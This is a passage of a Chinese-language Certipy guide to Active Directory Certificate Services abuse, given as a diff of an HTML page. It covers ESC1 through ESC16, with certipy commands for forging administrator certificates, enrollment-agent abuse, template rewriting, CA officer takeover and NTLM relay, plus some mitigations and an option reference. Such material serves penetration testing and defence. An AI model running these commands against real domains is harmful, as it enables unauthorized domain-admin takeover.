+<li><code>Client Authentication : True</code></li>
+<li><code>[+] User Enrollable Principals</code> 显示攻击者所属的组</li>
+</ul>
+<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p><strong>步骤 1：请求目标用户证书</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">certipy req \</span><br><span class="line">    -u <span class="string">&#x27;attacker@corp.local&#x27;</span> -p <span class="string">&#x27;Passw0rd!&#x27;</span> \</span><br><span class="line">    -dc-ip <span class="string">&#x27;10.0.0.100&#x27;</span> -target <span class="string">&#x27;CA.CORP.LOCAL&#x27;</span> \</span><br><span class="line">    -ca <span class="string">&#x27;CORP-CA&#x27;</span> -template <span class="string">&#x27;VulnTemplate&#x27;</span> \</span><br><span class="line">    -upn <span class="string">&#x27;administrator@corp.local&#x27;</span> -sid <span class="string">&#x27;S-1-5-21-...-500&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>步骤 2：使用证书进行身份验证</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy auth -pfx <span class="string">&#x27;administrator.pfx&#x27;</span> -dc-ip <span class="string">&#x27;10.0.0.100&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="缓解措施"><a href="#缓解措施" class="headerlink" title="缓解措施"></a>缓解措施</h4><ol>
+<li>禁用”注册者提供主题”选项</li>
+<li>限制注册权限仅授予特定用户或安全组</li>
+<li>实施管理员批准</li>
+<li>使用授权签名</li>
+<li>禁用未使用的模板</li>
+</ol>
+<hr>
+<h3 id="ESC2-任意用途证书模板"><a href="#ESC2-任意用途证书模板" class="headerlink" title="ESC2: 任意用途证书模板"></a>ESC2: 任意用途证书模板</h3><h4 id="描述-1"><a href="#描述-1" class="headerlink" title="描述"></a>描述</h4><p>ESC2 漏洞源于配置了”任意用途” EKU 或没有指定 EKU 的证书模板。”任意用途” EKU 由 OID 2.5.29.37.0 标识。</p>
+<p><strong>ESC2 漏洞条件：</strong></p>
+<ol>
+<li>模板包含”任意用途” EKU 或没有 EKU</li>
+<li>低特权用户被授予注册权限</li>
+</ol>
+<p>由于”任意用途”隐式授予”证书请求代理”能力，攻击者可以使用其”任意用途”证书代表其他用户（可能是域管理员）请求另一个证书。</p>
+<h4 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h4><p><strong>步骤 1：获取任意用途证书</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">certipy req \</span><br><span class="line">    -u <span class="string">&#x27;attacker@corp.local&#x27;</span> -p <span class="string">&#x27;Passw0rd!&#x27;</span> \</span><br><span class="line">    -dc-ip <span class="string">&#x27;10.0.0.100&#x27;</span> -target <span class="string">&#x27;CA.CORP.LOCAL&#x27;</span> \</span><br><span class="line">    -ca <span class="string">&#x27;CORP-CA&#x27;</span> -template <span class="string">&#x27;AnyPurposeCert&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>步骤 2：代表目标用户请求证书</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">certipy req \</span><br><span class="line">    -u <span class="string">&#x27;attacker@corp.local&#x27;</span> -p <span class="string">&#x27;Passw0rd!&#x27;</span> \</span><br><span class="line">    -dc-ip <span class="string">&#x27;10.0.0.100&#x27;</span> -target <span class="string">&#x27;CA.CORP.LOCAL&#x27;</span> \</span><br><span class="line">    -ca <span class="string">&#x27;CORP-CA&#x27;</span> -template <span class="string">&#x27;User&#x27;</span> \</span><br><span class="line">    -on-behalf-of <span class="string">&#x27;CORP\Administrator&#x27;</span> \</span><br><span class="line">    -pfx <span class="string">&#x27;attacker.pfx&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="ESC3-证书请求代理模板"><a href="#ESC3-证书请求代理模板" class="headerlink" title="ESC3: 证书请求代理模板"></a>ESC3: 证书请求代理模板</h3><h4 id="描述-2"><a href="#描述-2" class="headerlink" title="描述"></a>描述</h4><p>ESC3 源于危险的扩展密钥用法 (EKU)。如果证书模板配置了 Certificate Request Agent (1.3.6.1.4.1.311.20.2.1) EKU，该证书可用于”代表”其他用户签名证书请求。</p>
+<p><strong>滥用场景是两步过程：</strong></p>
+<ol>
+<li>请求并获取证书请求代理（注册代理）证书</li>
+<li>使用注册代理证书代表其他用户请求证书</li>
+</ol>
+<h4 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h4><p><strong>步骤 1：获取注册代理证书</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">certipy req \</span><br><span class="line">    -u <span class="string">&#x27;attacker@corp.local&#x27;</span> -p <span class="string">&#x27;Passw0rd!&#x27;</span> \</span><br><span class="line">    -dc-ip <span class="string">&#x27;10.0.0.100&#x27;</span> -target <span class="string">&#x27;CA.CORP.LOCAL&#x27;</span> \</span><br><span class="line">    -ca <span class="string">&#x27;CORP-CA&#x27;</span> -template <span class="string">&#x27;CustomEnrollmentAgent&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>步骤 2：代表目标用户请求证书</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">certipy req \</span><br><span class="line">    -u <span class="string">&#x27;attacker@corp.local&#x27;</span> -p <span class="string">&#x27;Passw0rd!&#x27;</span> \</span><br><span class="line">    -dc-ip <span class="string">&#x27;10.0.0.100&#x27;</span> -target <span class="string">&#x27;CA.CORP.LOCAL&#x27;</span> \</span><br><span class="line">    -ca <span class="string">&#x27;CORP-CA&#x27;</span> -template <span class="string">&#x27;User&#x27;</span> \</span><br><span class="line">    -on-behalf-of <span class="string">&#x27;CORP\Administrator&#x27;</span> \</span><br><span class="line">    -pfx <span class="string">&#x27;attacker.pfx&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="ESC4-特权访问证书模板"><a href="#ESC4-特权访问证书模板" class="headerlink" title="ESC4: 特权访问证书模板"></a>ESC4: 特权访问证书模板</h3><h4 id="描述-3"><a href="#描述-3" class="headerlink" title="描述"></a>描述</h4><p>ESC4 源于对证书模板对象本身的特权访问。如果攻击者对证书模板对象具有特权访问权限，则可以重新配置模板使其易受 ESC1 攻击。</p>
+<p><strong>所需权限：</strong></p>
+<ul>
+<li>WriteOwner</li>
+<li>WriteDacl</li>
+<li>WriteProperty</li>
+</ul>
+<h4 id="利用-3"><a href="#利用-3" class="headerlink" title="利用"></a>利用</h4><p><strong>步骤 1：保存当前配置</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">certipy template \</span><br><span class="line">    -u <span class="string">&#x27;attacker@corp.local&#x27;</span> -p <span class="string">&#x27;Passw0rd!&#x27;</span> \</span><br><span class="line">    -dc-ip <span class="string">&#x27;10.0.0.100&#x27;</span> \</span><br><span class="line">    -template <span class="string">&#x27;VulnTemplate&#x27;</span> \</span><br><span class="line">    -save-configuration <span class="string">&#x27;VulnTemplate.json&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>步骤 2：应用易受攻击的配置</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">certipy template \</span><br><span class="line">    -u <span class="string">&#x27;attacker@corp.local&#x27;</span> -p <span class="string">&#x27;Passw0rd!&#x27;</span> \</span><br><span class="line">    -dc-ip <span class="string">&#x27;10.0.0.100&#x27;</span> \</span><br><span class="line">    -template <span class="string">&#x27;VulnTemplate&#x27;</span> \</span><br><span class="line">    -write-default-configuration</span><br></pre></td></tr></table></figure>
+
+<p><strong>步骤 3：请求证书（ESC1 利用）</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">certipy req \</span><br><span class="line">    -u <span class="string">&#x27;attacker@corp.local&#x27;</span> -p <span class="string">&#x27;Passw0rd!&#x27;</span> \</span><br><span class="line">    -dc-ip <span class="string">&#x27;10.0.0.100&#x27;</span> -target <span class="string">&#x27;CA.CORP.LOCAL&#x27;</span> \</span><br><span class="line">    -ca <span class="string">&#x27;CORP-CA&#x27;</span> -template <span class="string">&#x27;VulnTemplate&#x27;</span> \</span><br><span class="line">    -upn <span class="string">&#x27;administrator@corp.local&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>步骤 4：恢复原始配置</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">certipy template \</span><br><span class="line">    -u <span class="string">&#x27;attacker@corp.local&#x27;</span> -p <span class="string">&#x27;Passw0rd!&#x27;</span> \</span><br><span class="line">    -dc-ip <span class="string">&#x27;10.0.0.100&#x27;</span> \</span><br><span class="line">    -template <span class="string">&#x27;VulnTemplate&#x27;</span> \</span><br><span class="line">    -write-configuration <span class="string">&#x27;VulnTemplate.json&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="ESC5-特权访问-PKI-对象"><a href="#ESC5-特权访问-PKI-对象" class="headerlink" title="ESC5: 特权访问 PKI 对象"></a>ESC5: 特权访问 PKI 对象</h3><p>ESC5 源于对 PKI 对象的特权访问。如果攻击者对 PKI 对象具有特权访问权限，则可以重新配置对象以实现特权提升。</p>
+<p>这可能包括：</p>
+<ul>
+<li>CA 对象</li>
+<li>证书模板容器</li>
+<li>OID 容器</li>
+<li>等</li>
+</ul>
+<hr>
+<h3 id="ESC6-EDITF-ATTRIBUTESUBJECTALTNAME2-标志"><a href="#ESC6-EDITF-ATTRIBUTESUBJECTALTNAME2-标志" class="headerlink" title="ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 标志"></a>ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 标志</h3><h4 id="描述-4"><a href="#描述-4" class="headerlink" title="描述"></a>描述</h4><p>ESC6 源于 CA 上的 <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> 标志。如果启用了此标志，则任何证书请求都可以包含任意主题备用名称 (SAN)，而不管模板配置如何。</p>
+<h4 id="识别-1"><a href="#识别-1" class="headerlink" title="识别"></a>识别</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy find -u <span class="string">&#x27;user@corp.local&#x27;</span> -p <span class="string">&#x27;password&#x27;</span> -dc-ip <span class="string">&#x27;10.0.0.100&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="利用-4"><a href="#利用-4" class="headerlink" title="利用"></a>利用</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">certipy req \</span><br><span class="line">    -u <span class="string">&#x27;attacker@corp.local&#x27;</span> -p <span class="string">&#x27;Passw0rd!&#x27;</span> \</span><br><span class="line">    -dc-ip <span class="string">&#x27;10.0.0.100&#x27;</span> -target <span class="string">&#x27;CA.CORP.LOCAL&#x27;</span> \</span><br><span class="line">    -ca <span class="string">&#x27;CORP-CA&#x27;</span> -template <span class="string">&#x27;User&#x27;</span> \</span><br><span class="line">    -upn <span class="string">&#x27;administrator@corp.local&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="缓解措施-1"><a href="#缓解措施-1" class="headerlink" title="缓解措施"></a>缓解措施</h4><p>禁用该标志：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">certutil -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2</span><br><span class="line">net stop certsvc &amp; net start certsvc</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="ESC7-特权访问-CA"><a href="#ESC7-特权访问-CA" class="headerlink" title="ESC7: 特权访问 CA"></a>ESC7: 特权访问 CA</h3><h4 id="描述-5"><a href="#描述-5" class="headerlink" title="描述"></a>描述</h4><p>ESC7 源于对 CA 对象本身的特权访问。如果攻击者对 CA 对象具有特权访问权限，则可以重新配置 CA 以实现特权提升。</p>
+<p><strong>CA 上的关键角色：</strong></p>
+<ul>
+<li><strong>ManageCA</strong> - 允许管理 CA 配置</li>
+<li><strong>ManageCertificates</strong> - 允许颁发&#x2F;拒绝证书请求</li>
+</ul>
+<h4 id="利用-5"><a href="#利用-5" class="headerlink" title="利用"></a>利用</h4><p><strong>授予自己 ManageCertificates 角色：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">certipy ca \</span><br><span class="line">    -u <span class="string">&#x27;attacker@corp.local&#x27;</span> -p <span class="string">&#x27;Passw0rd!&#x27;</span> \</span><br><span class="line">    -dc-ip <span class="string">&#x27;10.0.0.100&#x27;</span> -target <span class="string">&#x27;CA.CORP.LOCAL&#x27;</span> \</span><br><span class="line">    -ca <span class="string">&#x27;CORP-CA&#x27;</span> \</span><br><span class="line">    -add-officer <span class="string">&#x27;attacker&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>颁发待处理的证书请求：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">certipy ca \</span><br><span class="line">    -u <span class="string">&#x27;attacker@corp.local&#x27;</span> -p <span class="string">&#x27;Passw0rd!&#x27;</span> \</span><br><span class="line">    -dc-ip <span class="string">&#x27;10.0.0.100&#x27;</span> -target <span class="string">&#x27;CA.CORP.LOCAL&#x27;</span> \</span><br><span class="line">    -ca <span class="string">&#x27;CORP-CA&#x27;</span> \</span><br><span class="line">    -issue-request 1</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="ESC8-NTLM-中继到-AD-CS-HTTP-端点"><a href="#ESC8-NTLM-中继到-AD-CS-HTTP-端点" class="headerlink" title="ESC8: NTLM 中继到 AD CS HTTP 端点"></a>ESC8: NTLM 中继到 AD CS HTTP 端点</h3><h4 id="描述-6"><a href="#描述-6" class="headerlink" title="描述"></a>描述</h4><p>ESC8 源于启用了 NTLM 身份验证的 HTTP 端点。如果 CA 具有 HTTP 注册端点，则可以将 NTLM 身份验证中继到这些端点以获取证书。</p>
+<p><strong>易受攻击的端点：</strong></p>
+<ul>
+<li>&#x2F;certsrv&#x2F;certfnsh.asp</li>
+<li>&#x2F;certsrv&#x2F;certenroll&#x2F;</li>
+</ul>
+<h4 id="利用-6"><a href="#利用-6" class="headerlink" title="利用"></a>利用</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy relay -target <span class="string">&#x27;http://CA.CORP.LOCAL&#x27;</span> -ca <span class="string">&#x27;CORP-CA&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="ESC9-无安全扩展的证书"><a href="#ESC9-无安全扩展的证书" class="headerlink" title="ESC9: 无安全扩展的证书"></a>ESC9: 无安全扩展的证书</h3><p>ESC9 源于证书模板配置中缺少安全扩展。如果证书模板未配置为包含请求用户的 SID，则证书可能被滥用于特权提升。</p>
+<hr>
+<h3 id="ESC10-弱证书映射"><a href="#ESC10-弱证书映射" class="headerlink" title="ESC10: 弱证书映射"></a>ESC10: 弱证书映射</h3><p>ESC10 源于弱证书映射。如果环境未配置为使用强证书映射，则证书可能被滥用于特权提升。</p>
+<p><strong>两种变体：</strong></p>
+<ul>
+<li><strong>变体 1：</strong> 用户账户的 userCertificate 属性用于映射</li>
+<li><strong>变体 2：</strong> 用户账户的 altSecurityIdentities 属性用于映射</li>
+</ul>
+<hr>
+<h3 id="ESC11-IF-ENFORCEENCRYPTICERTREQUEST-标志"><a href="#ESC11-IF-ENFORCEENCRYPTICERTREQUEST-标志" class="headerlink" title="ESC11: IF_ENFORCEENCRYPTICERTREQUEST 标志"></a>ESC11: IF_ENFORCEENCRYPTICERTREQUEST 标志</h3><h4 id="描述-7"><a href="#描述-7" class="headerlink" title="描述"></a>描述</h4><p>ESC11 源于 CA 上的 <code>IF_ENFORCEENCRYPTICERTREQUEST</code> 标志未启用。如果未启用此标志，则可以通过 RPC 进行未加密的证书请求，容易受到中继攻击。</p>
+<h4 id="缓解措施-2"><a href="#缓解措施-2" class="headerlink" title="缓解措施"></a>缓解措施</h4><p>启用该标志：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">certutil -setreg CA\InterfaceFlags +IF_ENFORCEENCRYPTICERTREQUEST</span><br><span class="line">net stop certsvc &amp; net start certsvc</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="ESC12-PKINIT-缓存"><a href="#ESC12-PKINIT-缓存" class="headerlink" title="ESC12: PKINIT 缓存"></a>ESC12: PKINIT 缓存</h3><p>ESC12 源于 PKINIT 缓存行为。如果用户使用证书进行 PKINIT 身份验证，则 Kerberos 服务票据会被缓存，可能被滥用于特权提升。</p>
+<hr>
+<h3 id="ESC13-链接到高特权组的颁发策略"><a href="#ESC13-链接到高特权组的颁发策略" class="headerlink" title="ESC13: 链接到高特权组的颁发策略"></a>ESC13: 链接到高特权组的颁发策略</h3><h4 id="描述-8"><a href="#描述-8" class="headerlink" title="描述"></a>描述</h4><p>ESC13 源于颁发策略链接到高特权组。如果证书模板配置了链接到高特权组的颁发策略，则请求该模板的证书可能导致特权提升。</p>
+<h4 id="识别-2"><a href="#识别-2" class="headerlink" title="识别"></a>识别</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy find -u <span class="string">&#x27;user@corp.local&#x27;</span> -p <span class="string">&#x27;password&#x27;</span> -dc-ip <span class="string">&#x27;10.0.0.100&#x27;</span> -oids</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="ESC14-altSecurityIdentities-滥用"><a href="#ESC14-altSecurityIdentities-滥用" class="headerlink" title="ESC14: altSecurityIdentities 滥用"></a>ESC14: altSecurityIdentities 滥用</h3><p>ESC14 源于 altSecurityIdentities 属性的滥用。如果用户账户的 altSecurityIdentities 属性配置不当，则可能被滥用于特权提升。</p>
+<hr>
+<h3 id="ESC15-应用程序策略滥用-CVE-2024-49019"><a href="#ESC15-应用程序策略滥用-CVE-2024-49019" class="headerlink" title="ESC15: 应用程序策略滥用 (CVE-2024-49019)"></a>ESC15: 应用程序策略滥用 (CVE-2024-49019)</h3><p>ESC15 是 AD CS 中的漏洞，源于应用程序策略的滥用。如果证书模板允许在证书请求中指定应用程序策略，则可能被滥用于特权提升。</p>
+<hr>
+<h3 id="ESC16-代理提供程序滥用"><a href="#ESC16-代理提供程序滥用" class="headerlink" title="ESC16: 代理提供程序滥用"></a>ESC16: 代理提供程序滥用</h3><p>ESC16 源于代理提供程序的滥用。如果 CA 配置了代理提供程序，则可能被滥用于特权提升。</p>
+<hr>
+<h2 id="五、命令参考"><a href="#五、命令参考" class="headerlink" title="五、命令参考"></a>五、命令参考</h2><h3 id="全局选项"><a href="#全局选项" class="headerlink" title="全局选项"></a>全局选项</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy -h</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>选项</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-v, --version</code></td>
+<td>显示版本号</td>
+</tr>
+<tr>
+<td><code>-h, --help</code></td>
+<td>显示帮助信息</td>
+</tr>
+<tr>
+<td><code>-debug, --debug</code></td>
+<td>启用调试输出</td>
+</tr>
+</tbody></table>
+<h3 id="account-管理账户"><a href="#account-管理账户" class="headerlink" title="account - 管理账户"></a>account - 管理账户</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy account [create|<span class="built_in">read</span>|update|delete] -user &lt;SAMName&gt; [options]</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>选项</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-user &lt;SAMName&gt;</code></td>
+<td>账户的 SAM 账户名</td>
+</tr>
+<tr>
+<td><code>-group &lt;CN=Group,...&gt;</code></td>
+<td>要添加账户的组</td>
+</tr>
+<tr>
+<td><code>-dns &lt;hostname&gt;</code></td>
+<td>设置 DNS 主机名</td>
+</tr>
+<tr>
+<td><code>-upn &lt;user@domain&gt;</code></td>
+<td>设置用户主体名称</td>
+</tr>
+<tr>
+<td><code>-sam &lt;NewSAM&gt;</code></td>
+<td>设置新的 SAM 名称</td>
+</tr>
+<tr>
+<td><code>-spns &lt;SPN1,SPN2,...&gt;</code></td>
+<td>设置 SPN</td>
+</tr>
+<tr>
+<td><code>-pass &lt;password&gt;</code></td>
+<td>设置密码</td>
+</tr>
+</tbody></table>
+<h3 id="auth-使用证书认证"><a href="#auth-使用证书认证" class="headerlink" title="auth - 使用证书认证"></a>auth - 使用证书认证</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy auth -pfx &lt;cert.pfx&gt; [options]</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>选项</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-pfx &lt;file&gt;</code></td>
+<td>PFX&#x2F;P12 证书文件路径</td>
+</tr>
+<tr>
+<td><code>-password &lt;password&gt;</code></td>
+<td>PFX 密码</td>
+</tr>
+<tr>
+<td><code>-no-save</code></td>
+<td>不保存 Kerberos TGT</td>
+</tr>
+<tr>
+<td><code>-no-hash</code></td>
+<td>不请求 NT 哈希</td>
+</tr>
+<tr>
+<td><code>-print</code></td>
+<td>以 Kirbi 格式打印 TGT</td>
+</tr>
+<tr>
+<td><code>-kirbi</code></td>
+<td>保存为 .kirbi 格式</td>
+</tr>
+<tr>
+<td><code>-ldap-shell</code></td>
+<td>认证后启动 LDAP shell</td>
+</tr>
+</tbody></table>
+<h3 id="ca-管理-CA"><a href="#ca-管理-CA" class="headerlink" title="ca - 管理 CA"></a>ca - 管理 CA</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy ca -ca &lt;CAName&gt; [options]</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>选项</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-list-templates</code></td>
+<td>列出启用的模板</td>
+</tr>
+<tr>
+<td><code>-enable-template &lt;Template&gt;</code></td>
+<td>启用模板</td>
+</tr>
+<tr>
+<td><code>-disable-template &lt;Template&gt;</code></td>
+<td>禁用模板</td>
+</tr>
+<tr>
+<td><code>-issue-request &lt;ID&gt;</code></td>
+<td>颁发请求</td>
+</tr>
+<tr>
+<td><code>-deny-request &lt;ID&gt;</code></td>
+<td>拒绝请求</td>
+</tr>
+<tr>
+<td><code>-add-officer &lt;User&gt;</code></td>
+<td>添加 CA 管理员</td>
+</tr>
+<tr>
+<td><code>-remove-officer &lt;User&gt;</code></td>
+<td>移除 CA 管理员</td>
+</tr>
+</tbody></table>
+<h3 id="cert-管理证书"><a href="#cert-管理证书" class="headerlink" title="cert - 管理证书"></a>cert - 管理证书</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy cert [options]</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>选项</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-pfx &lt;infile&gt;</code></td>
+<td>从 PFX&#x2F;P12 文件加载</td>
+</tr>
+<tr>
+<td><code>-password &lt;password&gt;</code></td>
+<td>输入 PFX 密码</td>
+</tr>
+<tr>
+<td><code>-key &lt;infile&gt;</code></td>
+<td>从 PEM&#x2F;DER 文件加载私钥</td>
+</tr>
+<tr>
+<td><code>-cert &lt;infile&gt;</code></td>
+<td>从 PEM&#x2F;DER 文件加载证书</td>
+</tr>
+<tr>
+<td><code>-export</code></td>
+<td>导出为 PFX&#x2F;P12</td>
+</tr>
+<tr>
+<td><code>-out &lt;outfile&gt;</code></td>
+<td>输出文件名</td>
+</tr>
+<tr>
+<td><code>-nocert</code></td>
+<td>不在输出中包含证书</td>
+</tr>
+<tr>
+<td><code>-nokey</code></td>
+<td>不在输出中包含私钥</td>
+</tr>
+</tbody></table>
+<h3 id="find-枚举-AD-CS"><a href="#find-枚举-AD-CS" class="headerlink" title="find - 枚举 AD CS"></a>find - 枚举 AD CS</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy find [options]</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>选项</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-text</code></td>
+<td>输出为格式化文本文件</td>
+</tr>
+<tr>
+<td><code>-stdout</code></td>
+<td>输出到控制台</td>
+</tr>
+<tr>
+<td><code>-json</code></td>
+<td>输出为 JSON</td>
+</tr>
+<tr>
+<td><code>-csv</code></td>
+<td>输出为 CSV</td>
+</tr>
+<tr>
+<td><code>-output &lt;prefix&gt;</code></td>
+<td>输出文件前缀</td>
+</tr>
+<tr>
+<td><code>-enabled</code></td>
+<td>仅显示启用的模板</td>
+</tr>
+<tr>
+<td><code>-vulnerable</code></td>
+<td>仅显示易受攻击的模板</td>
+</tr>
+<tr>
+<td><code>-oids</code></td>
+<td>显示颁发策略 OID</td>
+</tr>
+<tr>
+<td><code>-hide-admins</code></td>
+<td>隐藏管理员权限</td>
+</tr>
+</tbody></table>
+<h3 id="forge-伪造证书"><a href="#forge-伪造证书" class="headerlink" title="forge - 伪造证书"></a>forge - 伪造证书</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy forge [options]</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>选项</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-ca-pfx &lt;file&gt;</code></td>
+<td>CA 证书&#x2F;密钥用于签名</td>
+</tr>
+<tr>
+<td><code>-ca-password &lt;password&gt;</code></td>
+<td>CA PFX 密码</td>
+</tr>
+<tr>
+<td><code>-subject &lt;DN&gt;</code></td>
+<td>证书主题</td>
+</tr>
+<tr>
+<td><code>-upn &lt;upn&gt;</code></td>
+<td>SAN UPN</td>
+</tr>
+<tr>
+<td><code>-dns &lt;dns&gt;</code></td>
+<td>SAN DNS</td>
+</tr>
+<tr>
+<td><code>-sid &lt;sid&gt;</code></td>
+<td>SID 扩展</td>
+</tr>
+<tr>
+<td><code>-template &lt;file&gt;</code></td>
+<td>克隆另一个证书</td>
+</tr>
+<tr>
+<td><code>-key-size &lt;bits&gt;</code></td>
+<td>密钥大小</td>
+</tr>
+<tr>
+<td><code>-validity-period &lt;days&gt;</code></td>
+<td>有效期</td>
+</tr>
+<tr>
+<td><code>-out &lt;file&gt;</code></td>
+<td>输出文件</td>
+</tr>
+</tbody></table>
+<h3 id="relay-NTLM-中继"><a href="#relay-NTLM-中继" class="headerlink" title="relay - NTLM 中继"></a>relay - NTLM 中继</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certipy relay -target &lt;proto://host&gt; [options]</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>选项</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-target &lt;proto://host&gt;</code></td>
+<td>目标 URL</td>
+</tr>
+<tr>
+<td><code>-ca &lt;CAName&gt;</code></td>
+<td>CA 名称</td>
+</tr>
+<tr>
+<td><code>-template &lt;Template&gt;</code></td>
+<td>证书模板</td>
+</tr>
+<tr>
+<td><code>-out &lt;file&gt;</code></td>
+<td>输出文件</td>
+</tr>
+<tr>
+<td><code>-interface &lt;IP&gt;</code></td>
+<td>绑定接口</td>
+</tr>
+<tr>
+<td><code>-port &lt;Port&gt;</code></td>
+<td>绑定端口</td>
+</tr>
+<tr>
+<td><code>-forever</code></td>
+<td>保持服务器运行</td>
+</tr>
+</tbody></table>
